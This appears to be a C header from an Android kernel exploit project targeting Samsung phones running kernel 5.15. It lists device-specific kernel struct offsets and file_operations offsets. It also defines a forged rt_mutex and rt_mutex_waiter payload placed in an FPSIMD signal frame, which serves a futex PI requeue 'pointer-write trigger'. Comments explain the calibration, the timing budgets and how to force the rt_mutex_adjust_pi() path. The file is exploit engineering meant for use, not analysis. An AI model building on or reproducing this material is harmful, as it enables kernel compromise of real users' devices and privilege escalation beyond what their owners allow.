#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

/* =========================================================================
 * FUTEX PI v14 POINTER-WRITE TRIGGER (src/futex_pi_v14.c)
 *
 * NOT YET ENABLED. Nothing in the live path calls futex_pi_v14_trigger();
 * src/fops.c still runs the CFI stage, which currently panics the kernel on
 * most boots (reboot immediately after "CFI owner read ret=8 value=0"). Cutover
 * is a separate, reviewed step: this block only makes the trigger COMPILE and
 * makes its constants auditable, it does not run it.
 *
 * -------------------------------------------------------------------------
 * PROVENANCE of every value below
 * -------------------------------------------------------------------------
 * A. Kernel-ABI offsets, read from THIS device's own vmlinux.btf
 *    (C:\Users\admin\AppData\Local\Temp\opencode\gzh2\vmlinux.btf, 139553 type
 *    records, GZE5/GZH2 same kernel build 5.15.189-android13-8-33404244).
 *    BTF member 'off' is in BITS; every value here is BTF_off/8. Struct
 *    'size' is in BYTES and is NOT divided.
 *
 *      struct rt_mutex_base        sizeof 0x20   wait_lock 0x00
 *                                               waiters   0x08
 *                                               owner     0x18
 *      struct rt_mutex             sizeof 0x20   vlen 1, only member is
 *                                               'rtmutex' -> proves
 *                                               CONFIG_RT_MUTEXES=y
 *      struct rt_mutex_waiter      sizeof 0x58   tree_entry    0x00
 *                                               pi_tree_entry 0x18
 *                                               task          0x30
 *                                               lock          0x38
 *                                               wake_state    0x40
 *                                               prio          0x44
 *                                               deadline      0x48
 *                                               ww_ctx        0x50
 *      struct rb_node              sizeof 0x18   __rb_parent_color 0x00
 *                                               rb_right        0x08
 *                                               rb_left         0x10
 *      struct rb_root_cached       sizeof 0x10   rb_root    0x00
 *                                               rb_leftmost 0x08
 *      struct task_struct         sizeof 0x1200  pi_lock      0x884
 *                                               pi_waiters   0x898
 *                                               prio         0x7c
 *                                               normal_prio  0x84
 *                                               policy       0x420
 *                                               pi_top_task  0x8a8
 *                                               pi_blocked_on 0x8b0
 *                                               robust_list  0x990
 *                                               pi_state_list 0x9a0
 *      struct fpsimd_context       sizeof 0x210  head 0x00 fpsr 0x08
 *                                               fpcr 0x0c vregs 0x10
 *      struct sigcontext           sizeof 0x1120 __reserved 0x120 (4096 B)
 *
 *    CONSEQUENCES worth stating because two of them contradict the usual
 *    "documented" 5.15 story:
 *      - task_struct HAS NO 'pi_state' MEMBER on this kernel. CONFIG_RT_MUTEXES
 *        moved the PI bookkeeping into the per-futex object: 'pi_state' in
 *        this kernel is struct futex_q.pi_state (futex_q+0x50), a pointer to
 *        struct futex_pi_state, whose pi_mutex (rt_mutex_base) sits at
 *        futex_pi_state+0x10. task_struct instead has pi_state_list at 0x9a0.
 *      - task_struct HAS NO 'exit_lock' MEMBER, anywhere in the BTF. exit_lock
 *        is pre-5.10; on 5.15 that job is done by pi_blocked_on + the
 *        scheduling tree, and rt_mutex_adjust_pi() is its only entry point.
 *      - struct robust_list is 8 bytes with a single member 'next'
 *        (robust_list+0x00), and task_struct.robust_list is at 0x990. The v14
 *        route does not touch it (see futex_pi_v14.c).
 *      - struct fpsimd_context is 0x210, NOT 0x108: vregs is __uint128_t[32]
 *        = 0x200 bytes, so vregs spans 0x10..0x20F and the 0x200-byte payload
 *        fits it exactly without touching fpsr/fpcr. Cross-checked against
 *        arch/arm64/include/uapi/asm/sigcontext.h in the stock source and
 *        against the NDK's asm/sigcontext.h, which are byte-identical.
 *
 * B. UAPI, not device-specific, but pinned here so the route is self-describing
 *    (include/uapi/linux/futex.h, include/linux/futex.h):
 *      FUTEX_LOCK_PI 6, FUTEX_UNLOCK_PI 7, FUTEX_WAIT_REQUEUE_PI 11,
 *      FUTEX_CMP_REQUEUE_PI 12, FUTEX_PRIVATE_FLAG 128.
 *    The reference deliberately issues ops 11 and 12 WITHOUT
 *    FUTEX_PRIVATE_FLAG, i.e. shared-keyed futexes. Kept verbatim: the
 *    FUTEX_CMP_REQUEUE_PI/EAGAIN handshake is calibrated to the shared key
 *    derivation, and switching to |FUTEX_PRIVATE_FLAG changes the key.
 *
 * C. Signal-frame record ABI (arch/arm64/include/uapi/asm/sigcontext.h, and
 *    identical in the NDK header used to compile this):
 *      FPSIMD_MAGIC 0x46508001, sizeof(struct _aarch64_ctx) 8.
 *    The record is found by WALKING the sigcontext record list at runtime
 *    (__reserved + 0x120), so there is no compile-time record offset at all.
 *
 * D. Stage field offsets inside the 0x200-byte FPSIMD payload. The payload is
 *    byte-identical to the reference's 06_signal_frame_payload.c. Its
 *    structure, re-derived from the BTF layouts above:
 *      payload+0x10  struct rt_mutex_base   (0x20 B, overlaps the waiter)
 *      payload+0x18  struct rt_mutex_waiter (0x58 B, 0x18..0x6F)
 *    The two objects deliberately SHARE one rb_node at payload+0x18, which is
 *    simultaneously rt_mutex_base.waiters.rb.rb_node (+0x08 -> 0x18) and
 *    rt_mutex_waiter.tree_entry (+0x00 -> 0x18). That is what makes a
 *    one-node waiters tree self-consistent: the root points at itself and
 *    rb_leftmost points at itself too. Every stage offset below is that
 *    structure, field by field:
 *      0x18 SIGNAL_TREE_PARENT     = rb_node.rb_parent_color   (+0x00)
 *      0x20 SIGNAL_TREE_RIGHT      = rb_node.rb_right         (+0x08)
 *      0x28 SIGNAL_TREE_LEFT       = rb_node.rb_left          (+0x10)
 *      0x30 SIGNAL_PI_TREE_PARENT  = rb_node.rb_parent_color  (+0x18)
 *      0x38 SIGNAL_PI_TREE_RIGHT   = rb_node.rb_right         (+0x20)
 *      0x40 SIGNAL_PI_TREE_LEFT    = rb_node.rb_left          (+0x28)
 *      0x48 SIGNAL_TASK            = task                     (+0x30)
 *      0x50 SIGNAL_LOCK            = lock                     (+0x38)
 *      0x58 SIGNAL_WAKE_STATE      = wake_state               (+0x40)
 *      0x5c SIGNAL_PRIO            = prio                     (+0x44)
 *      0x60 SIGNAL_DEADLINE        = deadline                 (+0x48)
 *      0x68 SIGNAL_WW_CTX          = ww_ctx                   (+0x50)
 *      0x70 SIGNAL_RT_MUTEX_OWNER  = rt_mutex_base.owner      (+0x18 of
 *                                        the rt_mutex_base at 0x10)
 *    NOTE the reference expresses the wake_state+prio pair as ONE 64-bit
 *    store (TARGET_SIGNAL_RB_TAG 0x8200000000), which is the same two fields:
 *    low u32 wake_state = 0, high u32 prio = 0x82. Kept as a single store
 *    because the two fields share one 8-byte straddle on aarch64 and one
 *    store is strictly safer than two.
 *
 * E. Timing / handshake budgets, copied from the reference's
 *    target_fuzz_v14 numbers for the S918B it was calibrated on. THEY HAVE NOT
 *    BEEN RECALIBRATED FOR F946B and are the single most likely reason a first
 *    run would not reproduce. They live here precisely so recalibration is a
 *    one-line change rather than a code change.
 * ========================================================================= */

/* --- (D) FPSIMD signal-frame payload layout ------------------------------- */
#define FUTEX_PI_V14_SIGNAL_PAYLOAD_SIZE 0x200U
#define FUTEX_PI_V14_SIGNAL_LOCK_BASE 0x10U   /* rt_mutex_base base */
#define FUTEX_PI_V14_SIGNAL_WAITER_BASE 0x18U /* rt_mutex_waiter base */
#define FUTEX_PI_V14_SIGNAL_TREE_PARENT 0x18U
#define FUTEX_PI_V14_SIGNAL_TREE_RIGHT 0x20U
#define FUTEX_PI_V14_SIGNAL_TREE_LEFT 0x28U
#define FUTEX_PI_V14_SIGNAL_PI_TREE_PARENT 0x30U
#define FUTEX_PI_V14_SIGNAL_PI_TREE_RIGHT 0x38U
#define FUTEX_PI_V14_SIGNAL_PI_TREE_LEFT 0x40U
#define FUTEX_PI_V14_SIGNAL_TASK 0x48U
#define FUTEX_PI_V14_SIGNAL_LOCK 0x50U
#define FUTEX_PI_V14_SIGNAL_WAKE_STATE 0x58U
#define FUTEX_PI_V14_SIGNAL_PRIO 0x5cU
#define FUTEX_PI_V14_SIGNAL_DEADLINE 0x60U
#define FUTEX_PI_V14_SIGNAL_WW_CTX 0x68U
#define FUTEX_PI_V14_SIGNAL_RT_MUTEX_OWNER 0x70U
/* wake_state (low u32) = TASK_NORMAL 0, prio (high u32) = 130. */
#define FUTEX_PI_V14_SIGNAL_WAKE_STATE_PRIO 0x8200000000ULL

/* --- (B) FUTEX ABI -------------------------------------------------------- */
#define FUTEX_PI_V14_OP_LOCK_PI 6
#define FUTEX_PI_V14_OP_UNLOCK_PI 7
#define FUTEX_PI_V14_OP_WAIT_REQUEUE_PI 11
#define FUTEX_PI_V14_OP_CMP_REQUEUE_PI 12

/* --- (C) ARM64 signal-frame record ABI ----------------------------------- */
#define FUTEX_PI_V14_FPSIMD_MAGIC 0x46508001U
#define FUTEX_PI_V14_AARCH64_CTX_SIZE 8U
#define FUTEX_PI_V14_FPSIMD_VREGS_OFF 0x10U
#define FUTEX_PI_V14_FPSIMD_VREGS_SIZE 0x200U

/* --- (E) handshake budgets (NOT recalibrated for F946B) ------------------ */
#define FUTEX_PI_V14_WAIT_SEC 8
#define FUTEX_PI_V14_POLL_USEC 1000
#define FUTEX_PI_V14_PAUSE_USEC 100000
#define FUTEX_PI_V14_READY_TIMEOUT_MS 5000
#define FUTEX_PI_V14_GATE_TIMEOUT_MS 2000
#define FUTEX_PI_V14_LONG_SPIN_MAX 0x3b9ac9ffULL
/* Consumer-side pre-sched_setattr spin, in cntvct cycles. */
#define FUTEX_PI_V14_DELAY_CYCLES 0ULL
/* sched_policy written by the critical sched_setattr. 3 = SCHED_BATCH: the
 * policy CHANGE is what forces the scheduler to take the rt_mutex_adjust_pi()
 * path; setting only a nice value does not. */
#define FUTEX_PI_V14_SETAUNCH_POLICY 3
#define FUTEX_PI_V14_SETAUNCH_NICE 1

#endif
